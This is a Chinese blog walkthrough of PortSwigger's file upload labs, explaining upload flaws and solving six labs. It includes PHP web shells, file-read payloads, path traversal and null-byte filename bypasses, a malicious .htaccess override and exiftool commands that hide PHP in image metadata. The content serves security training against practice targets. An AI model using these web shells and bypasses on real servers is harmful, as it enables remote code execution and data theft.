# 原创
：  【burpsuite安全练兵场-服务端8】文件上传漏洞-7个实验（全）

# 【burpsuite安全练兵场-服务端8】文件上传漏洞-7个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）有缺陷的文件类型验证（√）
（2）防止在用户可访问的目录中执行文件（√）
（3）危险文件类型的黑名单不足（√）
（4）文件内容的验证存在缺陷（√）
（5）利用文件上载争用条件（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、文件上传漏洞](#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E)

[1、意义：](#1%E3%80%81%E6%84%8F%E4%B9%89%EF%BC%9A)

[2、影响](#2%E3%80%81%E5%BD%B1%E5%93%8D)

[3、产生](#3%E3%80%81%E4%BA%A7%E7%94%9F)

[4、服务器处理静态文件请求的机制](#4%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%84%E7%90%86%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9C%BA%E5%88%B6)

[二、利用不受限制的文件上载来部署Web Shell](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8D%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BD%BD%E6%9D%A5%E9%83%A8%E7%BD%B2Web%20Shell)

[ 1、简述：](#%C2%A01%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%80%9A%E8%BF%87web%20shell%E4%B8%8A%E4%BC%A0%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)[实验1：通过web shell上传的远程代码执行](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%80%9A%E8%BF%87web%20shell%E4%B8%8A%E4%BC%A0%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)

[三、利用文件上载的错误验证](#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BD%BD%E7%9A%84%E9%94%99%E8%AF%AF%E9%AA%8C%E8%AF%81)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、有缺陷的文件类型验证](#2%E3%80%81%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E9%AA%8C%E8%AF%81)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E9%80%9A%E8%BF%87%E5%86%85%E5%AE%B9%E7%B1%BB%E5%9E%8B%E9%99%90%E5%88%B6%E6%97%81%E8%B7%AF%E7%9A%84Web%20shell%E4%B8%8A%E8%BD%BD)[实验2：通过内容类型限制旁路的Web shell上载](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E9%80%9A%E8%BF%87%E5%86%85%E5%AE%B9%E7%B1%BB%E5%9E%8B%E9%99%90%E5%88%B6%E6%97%81%E8%B7%AF%E7%9A%84Web%20shell%E4%B8%8A%E8%BD%BD)

[3、防止在用户可访问的目录中执行文件](#%C2%A03%E3%80%81%E9%98%B2%E6%AD%A2%E5%9C%A8%E7%94%A8%E6%88%B7%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E7%BB%8F%E7%94%B1%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E8%BD%BD)[实验3：经由路径遍历的Web外壳上载](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E7%BB%8F%E7%94%B1%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E8%BD%BD)

[4、危险文件类型的黑名单不足](#3%E3%80%81%E5%8D%B1%E9%99%A9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8D%E8%B6%B3)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E9%80%9A%E8%BF%87%E6%89%A9%E5%B1%95%E9%BB%91%E5%90%8D%E5%8D%95%E6%97%81%E8%B7%AF%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E4%BC%A0)[实验4：通过扩展黑名单旁路的Web外壳上传](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E9%80%9A%E8%BF%87%E6%89%A9%E5%B1%95%E9%BB%91%E5%90%8D%E5%8D%95%E6%97%81%E8%B7%AF%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E4%BC%A0)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E9%80%9A%E8%BF%87%E6%A8%A1%E7%B3%8A%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E4%BC%A0)[实验5：通过模糊文件扩展名的Web外壳上传](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E9%80%9A%E8%BF%87%E6%A8%A1%E7%B3%8A%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E4%BC%A0)

[5、文件内容的验证存在缺陷](#4%E3%80%81%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%9A%84%E9%AA%8C%E8%AF%81%E5%AD%98%E5%9C%A8%E7%BC%BA%E9%99%B7)

[        ](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E9%80%9A%E8%BF%87%E5%A4%9A%E8%AF%AD%E7%A7%8Dweb%20shell%E4%B8%8A%E4%BC%A0%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)[实验6：通过多语种web shell上传的远程代码执行](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E9%80%9A%E8%BF%87%E5%A4%9A%E8%AF%AD%E7%A7%8Dweb%20shell%E4%B8%8A%E4%BC%A0%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)

[6、利用文件上载争用条件](#5%E3%80%81%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BD%BD%E4%BA%89%E7%94%A8%E6%9D%A1%E4%BB%B6)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E9%80%9A%E8%BF%87%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E8%BD%BD)[实验7：通过竞态条件的Web外壳上载](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E9%80%9A%E8%BF%87%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E7%9A%84Web%E5%A4%96%E5%A3%B3%E4%B8%8A%E8%BD%BD)

[四、利用文件上载漏洞而不远程执行代码](#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BD%BD%E6%BC%8F%E6%B4%9E%E8%80%8C%E4%B8%8D%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81)

[1、上传恶意客户端脚本](#%C2%A01%E3%80%81%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%9A%E6%9C%AC)

[2、利用上载文件解析中的漏洞](#2%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8A%E8%BD%BD%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E)

[3、使用PUT上载文件](#3%E3%80%81%E4%BD%BF%E7%94%A8PUT%E4%B8%8A%E8%BD%BD%E6%96%87%E4%BB%B6)

---


## 一、文件上传漏洞

> 
<h3>1、意义：</h3>
1、原理：文件上传漏洞是指Web服务器允许用户将文件上传到其文件系统，而不充分验证文件的名称、类型、内容或大小等内容。如果不能正确地执行这些限制，可能意味着即使是基本的图像上传功能也可以用来上传任意的和潜在危险的文件。这甚至可以包括支持远程代码执行的服务器端脚本文件
<hr/>
2、危害：在某些情况下，上传文件的行为本身就足以造成损害。其他攻击可能涉及对文件的后续HTTP请求，通常是为了触发服务器执行该文件


> 
<h3>2、影响</h3>
1、文件上传漏洞的影响通常取决于两个关键因素：
    网站未能正确验证文件的哪个方面，无论是文件的大小、类型、内容等。<br/>     文件成功上载后会对其施加哪些限制
<hr/>
2、在最坏的情况下，文件的类型没有得到正确的验证，服务器配置允许某些类型的文件（如.php和.jsp）作为代码执行。在这种情况下，攻击者可能会上载充当Web外壳的服务器端代码文件，从而有效地授予他们对服务器的完全控制权。
<hr/>
3、如果文件名未正确验证，则攻击者只需上载同名文件即可覆盖重要文件。如果服务器也容易受到目录遍历的攻击，这可能意味着攻击者甚至能够将文件上载到意想不到的位置。
<hr/>
4、如果无法确保文件大小预期阈值范围内，还可能会启用某种形式的拒绝服务（DoS）攻击，攻击者会借此填满可用磁盘空间。 


---


> 
<h3>3、产生</h3>
1、现状：考虑到相当明显的危险，很少有网站对用户可以上传的文件没有任何限制。更常见的情况是，开发人员实现他们认为是健壮的验证，但这些验证要么存在固有缺陷，要么很容易被绕过。
<hr/>
2、绕过：如试图将危险的文件类型列入黑名单，但在检查文件扩展名时无法考虑解析差异。与任何黑名单一样，它也很容易意外地忽略了更模糊的文件类型，这些文件类型可能仍然是危险的。
<hr/>
3、工具：在其他情况下，网站可能会尝试通过验证攻击者可以使用Burp Proxy或Repeater等工具轻松操纵的属性来检查文件类型。
<hr/>
4、结论：即使是稳健的验证措施也可能在构成网站的主机和目录网络中应用不一致，导致可能被利用的差异。


---


> 
<h3>4、服务器处理静态文件请求的机制</h3>
1、前提：在研究如何利用文件上传漏洞之前，必须了解服务器如何处理静态文件请求
<hr/>
2、历史：网站几乎完全由静态文件组成，当用户请求时，这些静态文件将被提供给用户。因此，每个请求的路径可以与服务器文件系统上的目录和文件的层次结构1：1映射。
<hr/>
3、现状：网站的动态性越来越强，请求的路径通常与文件系统没有任何直接关系。但web服务器仍然处理对一些静态文件的请求，包括样式表、图像等等。
<hr/>
4、结论：处理这些静态文件的过程在很大程度上仍然相同。在某些时候，服务器解析请求中的路径以标识文件扩展名。然后使用该映射来确定所请求文件的类型，通常是将其与扩展名和MIME类型之间的预配置映射列表进行比较。接下来会发生什么取决于文件类型和服务器的配置。 
<hr/>
5、示例
<pre><code>（1）不可执行文件：文件类型是不可执行的，例如图像或静态HTML页面，则服务器可能只会在HTTP响应中将文件的内容发送到客户机。
（2）可执行文件：文件类型为可执行文件（如PHP文件），并且服务器配置为执行此类型的文件，则服务器将在运行脚本之前根据HTTP请求中的标头和参数分配变量。然后可以在HTTP响应中将结果输出发送到客户端。
（3）可执行文件，但配置不执行：文件类型为可执行文件，但服务器不是配置为执行此类型的文件时，它通常会以错误响应。但在某些情况下，文件的内容可能仍以纯文本形式提供给客户端。此类错误配置偶尔会被利用来泄漏源代码和其他敏感信息。</code></pre>



---


---


## 二、利用不受限制的文件上载来部署Web Shell

> 
<h3> 1、简述：</h3>
1、从安全角度来看，最糟糕的情况是网站允许您上载服务器端脚本（如PHP、Java或Python文件），并且还配置为将它们作为代码执行。这使得在服务器上创建自己的web shell变得很简单。
<hr/>
2、Web shell是一种恶意脚本，攻击者只需通过向正确的端点发送HTTP请求，就可以在远程Web服务器上执行任意命令
<hr/>
<br/> 3、如果能够成功地上传一个web shell，那么实际上就拥有了对服务器的完全控制。这意味着可以读取和写入任意文件、泄露敏感数据，甚至使用服务器来针对内部基础架构和网络外部的其他服务器发起攻击。
<pre><code>例如，以下PHP一行程序可用于从服务器的文件系统读取任意文件：
&lt;?php echo file_get_contents('/path/to/target/file'); ?&gt;

上传后，发送此恶意文件的请求将在响应中返回目标文件的内容</code></pre>

<pre><code>1、更通用的web shell可能如下所示：
&lt;?php echo system($_GET['command']); ?&gt;

2、此脚本允许通过查询参数传递任意系统命令，如下所示：
GET /example/exploit.php?command=id HTTP/1.1</code></pre>
<hr/>
4、涉及实验：
实验1：通过web shell上传的远程代码执行



---


> 
<h3>实验1：通过web shell上传的远程代码执行</h3>
信息：
本实验包含易受攻击的图像上载函数。在将用户上传的文件存储到服务器的文件系统之前，它不会对这些文件执行任何验证。
要完成实验，请上传一个基本的PHP Web shell，并使用它来过滤文件/home/carlos/secret的内容并提交
已有账号：wiener:peter
<hr/>
part1:
通过Burp代理流量时，登录您的帐户，注意上传头像图像的选项


<br/> 上传任意图片，然后返回您的帐户页面（页面上现在显示了虚拟形象的预览）
（测试发现，其实对于上传的文件类型，没有任何限制）



效果展示

<hr/>
part2:
分析数据包
HTTP历史记录-----单击过滤器栏以打开"过滤器设置"对话框------启用"图像"复选框
 <img alt="" height="455" src="https://img-blog.csdnimg.cn/24e3c84ed4ee45938563afecc2d9408e.png" width="930"/>

在代理历史记录中，请注意您的图像是使用 GET 请求/files/avatars/&amp;lt获取的



<hr/>
part3：
完成实验
电脑上，创建一个php的文件，其中包含用于获取Carlos秘密文件内容的脚本（或者直接使用后门代码get shell），如：
<pre>`&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;`</pre>
<img alt="" height="164" src="https://img-blog.csdnimg.cn/726f4f41d0344198b0b4f658b51808dc.png" width="633"/><br/> 使用头像上传功能上传恶意PHP文件
 并上传成功（因为不是图片，所以加载不出来）

 在响应中可以回显加载的内容，被以text文件形式显示



也可以在Burp Repeater中，更改请求的路径以指向PHP文件

 完成实验




---


## 三、利用文件上载的错误验证

> 
<h3>1、简述：</h3>
1、现状：不太可能找到对文件上传攻击没有任何保护的网站。但仅仅因为防御到位，并不意味着他们是强大的。
<hr/>
2、将了解Web服务器尝试验证和清理文件上载的一些方法，以及如何利用这些机制中的缺陷来获取用于远程代码执行的Web shell。


> 
<h3>2、有缺陷的文件类型验证</h3>
1、提交HTML表单时，浏览器通常将提供的数据发送到后请求的内容类型application/x-www-form-url-encoded。这适用于发送简单文本，如姓名、地址等，但不适用于发送大量二进制数据，如整个图像文件或PDF文档。在本例中，内容类型multipart/form-data是优选的方法。
<hr/>
2、考虑一个表单，其中包含用于上载图像、提供图像描述和输入用户名的字段。提交这样的表单可能会导致类似下面的请求： <br/>  
<pre><code>POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--</code></pre>
<hr/>
3、处理：消息正文被拆分为表单的每个输入的单独部分。每个部分都包含一个Content-Disposition头，它提供了与之相关的输入字段的一些基本信息。这些单独的部分还可能包含它们自己的Content-Type头，它告诉服务器使用此输入提交的数据的MIME类型。
<hr/>
4、利用：网站尝试验证文件上载的一种方法是检查此特定于输入的Content-Type标头是否与预期的MIME类型匹配。如果服务器只需要图像文件，它可能只允许image/jpeg和image/png这样的类型。当服务器隐式信任此标头的值时，可能会出现问题。如果没有执行进一步的验证来检查文件的内容实际上是否与假定的MIME类型匹配，则可以使用Burp Repeater之类的工具轻松绕过此防御<br/>  
<hr/>
5、涉及实验：
实验2：通过内容类型限制旁路的Web shell上载


---


---


> 
<h3>实验2：通过内容类型限制旁路的Web shell上载</h3>
信息：
本实验包含易受攻击的图像上载函数。它试图阻止用户上载意外的文件类型，但依赖于检查用户可控的输入来验证这一点。
要完成实验，请上传一个基本的PHP Web shell，并使用它来过滤文件/home/carlos/secret的内容并提交
已有账号：wiener:peter
<hr/>
part1：
登录并上传图像作为头像，然后返回帐户页面<br/> HTTP历史记录中，请求类型GET /files/avatars/&lt;YOUR-IMAGE&gt;


在您的系统上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本。
<pre><code>例如：
&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>

图片样式未变，说明有检测（上传失败）

分析数据包（对文件类型应该是有检测）



<hr/>
part2:
拦截数据包进行分析


<br/> 响应表明您只能上载MIME类型为image/jpeg或image/png的文件
修改Content-Type值，并发送



文件成功上传

<hr/>
part3：
完成实验
直接在HTTP记录中查看响应包中返回的数据
<pre>`Cw5LnCcKlcIEB9qeBBXq5bQl1t88jRx9`</pre>





---


> 
<h3>3、防止在用户可访问的目录中执行文件</h3>
1、虽然首先防止危险的文件类型被上传显然更好，但第二道防线是阻止服务器执行任何从网络上溜走的脚本。
<hr/>
2、作为预防措施，服务器通常只运行那些MIME类型被显式配置为可执行的脚本。否则，它们可能只返回某种错误消息，或者在某些情况下，将文件的内容作为纯文本提供：
<pre><code>GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

&lt;?php echo system($_GET['command']); ?&gt;</code></pre>
<hr/>
3、这种行为可能会提供一种泄漏源代码的方法，但它会使任何创建web shell的尝试无效
<hr/>
4、这种配置通常因目录而异。用户提供的文件上载到的目录可能比文件系统上其他位置（假定最终用户无法访问）具有更严格的控制。如果能找到一种方法将脚本上载到不应该包含用户提供的文件的不同目录，那么服务器最终可能会执行您的脚本
5、还应该注意到，即使可能将所有请求发送到同一个域名，这通常指向某种反向代理服务器，如负载平衡器。请求通常由其他服务器在后台处理，这些服务器的配置也可能有所不同。 
<hr/>
6、涉及实验：<br/> 实验3：经由路径遍历的Web外壳上载


---


---


> 
<h3>实验3：经由路径遍历的Web外壳上载</h3>
信息：
本实验包含易受攻击的图像上载函数。服务器配置为阻止执行用户提供的文件，但利用次要漏洞可以绕过此限制。
要完成实验，请上传一个基本的PHP Web shell，并使用它来过滤文件/home/carlos/secret的内容并提交<br/> 已有账号：wiener:peter
<hr/>
part1:
登录并上传图像作为您的头像，然后返回帐户页面
电脑上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本。
<pre><code>例如：
&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>



虽然上传成功，但服务器没有执行脚本并返回输出，而是以纯文本形式返回PHP文件的内容


<hr/>
part2:
在Burp的代理历史记录中，找到用于提交文件上传的POST/my-account/avatar请求，并将其发送到Burp Repeater
<pre><code>找到与PHP文件相关的请求主体部分。在Content-Disposition标头中，更改文件名以包含目录遍历序列：
Content-Disposition: form-data; name="avatar"; filename="../1.php"</code></pre>
注意响应显示文件avatars/1.php已经上传。这表明服务器正在从文件名中剥离目录遍历序列

 <img alt="" height="931" src="https://img-blog.csdnimg.cn/4009a2d53eef4c35a266330a093512f0.png" width="1200"/>
<hr/>
part3:
进行URL编码
<pre>`filename="..%2fexploit.php"`</pre>
 程序对URL编码进行了解码


刷新主页，并在Burp的代理历史记录中，找到GET /files/avatars/..%2f1.php文件请求，发送到repeater
<img alt="" height="931" src="https://img-blog.csdnimg.cn/b54fa78129d74700ae2fcc83b4cc8f3c.png" width="1200"/>将请求修改为../1.php
返回包中包含了数据

 <img alt="" height="655" src="https://img-blog.csdnimg.cn/61be7f85623341e8a986f475c30db974.png" width="1200"/>




---


> 
<h3>4、危险文件类型的黑名单不足</h3>
1、机制：防止用户上传恶意脚本的一个更明显的方法是将具有潜在危险的文件扩展名（如.php）列入黑名单。黑名单的做法是有内在缺陷的，因为很难显式地阻止每一个可能用于执行代码的文件扩展名。这种黑名单有时可以通过使用不太为人所知的、仍然可以执行的替代文件扩展名（如.php5、.shtml等）来绕过。
<hr/>
2、覆盖服务器配置
服务器通常不会执行文件，除非它们被配置为执行文件。
<pre><code>例如，在Apache服务器执行客户端请求的PHP文件之前，开发人员可能需要将以下指令添加到/etc/apache 2/apache2.conf文件中：
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php</code></pre>
<hr/>
3、许多服务器还允许开发人员在各个目录中创建特殊的配置文件，以便覆盖或添加到一个或多个全局设置。例如，Apache服务器将从名为. htaccess网站如果存在话。
<pre><code>同样，开发人员可以使用web.config文件。这可能包括如下指令，在本例中，这些指令允许将JSON文件提供给用户：
&lt;staticContent&gt;
    &lt;mimeMap fileExtension=".json" mimeType="application/json" /&gt;
&lt;/staticContent&gt;</code></pre>
Web服务器使用这些类型的配置文件（如果存在），但通常不允许使用HTTP请求访问它们。但可能偶尔会发现服务器无法阻止上载自己的恶意配置文件。在这种情况下，即使需要的文件扩展名被列入黑名单，也可以欺骗服务器将任意的自定义文件扩展名映射到可执行MIME类型<br/>  
————
4、涉及实验：
实验4：通过扩展黑名单旁路的Web外壳上传
<hr/>
5、混淆文件扩展名
即使是最详尽的黑名单也可以使用经典的模糊技术绕过。假设验证代码区分大小写，无法识别exploit.pHp实际上是一个.php文件。如果随后将文件扩展名映射到MIME类型的代码不区分大小写，则这种差异允许您偷偷地让恶意PHP文件通过最终可能由服务器执行的验证。
<pre><code>方法：

    1、提供多个扩展名。根据用于解析文件名的算法，以下文件可能被解释为PHP文件或JPG图像：exploit.php.jpg
    2、添加尾随字符。有些组件会去除或忽略尾随的空格、点等：exploit.php.
    3、尝试对点、正斜杠和反斜杠使用URL编码（或双URL编码）。如果在验证文件扩展名时没有解码该值，但后来在服务器端解码了该值，这也会允许您上传恶意文件，否则这些文件将被阻止：利用%2Ephp
    4、在文件扩展名前添加分号或URL编码的空字节字符。例如，如果验证是用PHP或Java等高级语言编写的，但服务器使用C/C++中的低级函数来处理文件，则这可能会导致文件名末尾的处理不一致：开发工具. asp;.jpg或利用. asp%00.jpg
    5、尝试使用多字节unicode字符，在unicode转换或规范化之后，这些字符可能会转换为空字节和点。像这样的序列xC0 x2E，xC4 xAE或xC0 xAE可以被翻译成x2E如果文件名被解析为UTF-8字符串，但在用于路径之前转换为ASCII字符。</code></pre>
<hr/>
6、其他防御措施包括剥离或替换危险的扩展名，以防止文件被执行。如果此转换不是递归应用的，则可以将禁用的字符串放置在适当的位置，以便在删除它时仍然保留有效的文件扩展名。
<pre><code>例如，php语言（非递归剥离）
exploit.p.phphp</code></pre>
————
7、涉及实验：
实验5：通过模糊文件扩展名的Web外壳上传



---


---


> 
<h3>实验4：通过扩展黑名单旁路的Web外壳上传</h3>
信息：
本实验包含易受攻击的图像上载函数。某些文件扩展名被列入黑名单，但由于此黑名单配置中的基本缺陷，可以绕过此防御。
要解决实验问题，请上传一个基本的PHP Web shell，然后使用它对文件/home/carlos/secret的内容进行过滤并提交
已有账号：wiener:peter
<hr/>
part1:
登录并上传图像作为您的头像，然后返回帐户页面
电脑上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本。
<pre><code>例如：
&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>

上传失败


在HTTP历史记录中，数据请求以POST /files/avatars/&lt;YOUR-IMAGE&gt;
PHP文件不被允许


<hr/>
part2:
将POST/my-account/avatar请求发送到repeater
<pre><code>    1、将filename参数的值更改为.htaccess
    2、将Content-Type标头的值更改为text/plain
    3、用以下Apache指令替换文件（PHP有效负载）的内容：AddType application/x-httpd-php .l33t
这会将任意扩展名（.l33t）映射到可执行MIME类型application/x-httpd-php。由于服务器使用mod_php模块，它已经知道如何处理这个问题</code></pre>
发送请求并观察文件已成功上载


<hr/>
part3:
上传PHP载荷的文件
将filename参数的值从php后缀更改为l33t后缀。再次发送请求，并注意到文件已成功上载


上传成功
<img alt="" height="770" src="https://img-blog.csdnimg.cn/bfd7f55f55c948689c22637ed52ba671.png" width="1082"/><br/>  

<hr/>
part4：
完成实验
 浏览响应包数据
<pre>`YNwxnSxzWSFL7rX12qozRhxc24WQxpEO`</pre>

 <img alt="" height="632" src="https://img-blog.csdnimg.cn/b86c1a975d384331938dc9769b30f75e.png" width="1200"/>




---


---


> 
<h3>实验5：通过模糊文件扩展名的Web外壳上传</h3>
信息：
本实验包含易受攻击的图像上载函数。某些文件扩展名被列入黑名单，但使用经典的模糊技术可以绕过这种防御。
要解决实验问题，上传一个基本的PHP Web shell，然后使用它对文件/home/carlos/secret的内容进行过滤并提交<br/> 已有账号：wiener:peter
<hr/>
part1:
登录并上传图像作为您的头像，然后返回帐户页面
电脑上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本
<pre>`&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;`</pre>

响应表明只允许您上载JPG和PNG文件

<hr/>
part2:
 在Burp的HTTP历史记录中，找到用于提交文件上传的POST/my-account/avatar请求。把这个发给repeater
在Burp Repeater中，转到POST/my-account/avatar请求的选项卡，找到与PHP文件相关的身体部分。
<pre><code>在Content-Disposition标头中，更改filename参数的值，使其包含URL编码的空字节，后跟. jpg扩展名：
filename="1.php%00.jpg"</code></pre>
<br/> 发送请求并观察文件是否已成功上载（消息将文件称为1.php，这表明空字节和. jpg扩展名已经被去除）

修改数据，并关闭拦截


回到主页，上传成功并加载

<hr/>
part3：
完成实验
在HTTP历史记录中浏览请求包
并发送到repeater

 修改文件名（截断后的文件名）

 <img alt="" height="758" src="https://img-blog.csdnimg.cn/022fef4265b7467fb986069d7056c55b.png" width="1200"/>
 <img alt="" height="561" src="https://img-blog.csdnimg.cn/1414693e0ba1401d94cb83e31a68a8e5.png" width="1200"/>



---


> 
<h3>5、文件内容的验证存在缺陷</h3>
1、而不是完全信任Content-Type在请求中指定，则更安全的服务器会尝试验证文件的内容是否确实与预期内容匹配。
<hr/>
2、在图像上传功能的情况下，服务器可能会尝试验证图像的某些固有属性，例如其尺寸。如果尝试上传一个PHP脚本，它将根本没有任何维度。因此服务器可以推断它不可能是图像，并相应地拒绝上载。
<hr/>
3、类似地，某些文件类型可能总是在其页眉或页脚中包含特定的字节序列。这些可以像指纹或签名一样用于确定内容是否与预期类型匹配。如JPEG文件始终以字节FF D8 FF开始。
<hr/>
4、这是一种更加健壮的文件类型验证方法，但即使这样也不是万无一失的。使用ExifTool等特殊工具，创建元数据中包含恶意代码的多语言JPEG文件可能很简单。 
<hr/>
5、涉及实验：<br/> 实验6：通过多语种web shell上传的远程代码执行


---


---


> 
<h3>实验6：通过多语种web shell上传的远程代码执行</h3>
信息：
本实验包含易受攻击的图像上载函数。尽管它会检查文件的内容以验证它是一个真正的映像，但仍然可以上载和执行服务器端代码。
要解决实验问题，请上传一个基本的PHP Web shell，然后使用它对文件/home/carlos/secret的内容进行过滤并提交
已有账号：wiener:peter
<hr/>
part1:
登录并上传图像作为您的头像，然后返回帐户页面
电脑上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本
<pre>`&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;`</pre>

响应表明服务器成功阻止您上载非图像文件

<hr/>

part2:
先在kali中安装软件
<pre><code>输入
exiftool</code></pre>

准备一个图片
 <img alt="" height="919" src="https://img-blog.csdnimg.cn/6c3ea6d884bb47239eb5ef62891b57c4.png" width="1030"/>

创建一个多语言PHP/JPG文件，该文件基本上是一个普通的图像，但在其元数据中包含PHP有效负载。执行此操作的简单方法是从命令行下载并运行ExifTool，如下所示：<br/>  
<pre>`exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" &lt;YOUR-INPUT-IMAGE&gt;.jpg -o 2.php`</pre>
或者在Windows上下载一个exe文件
<pre>`./ExifTool.exe -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" test.png -o 2.php`</pre>

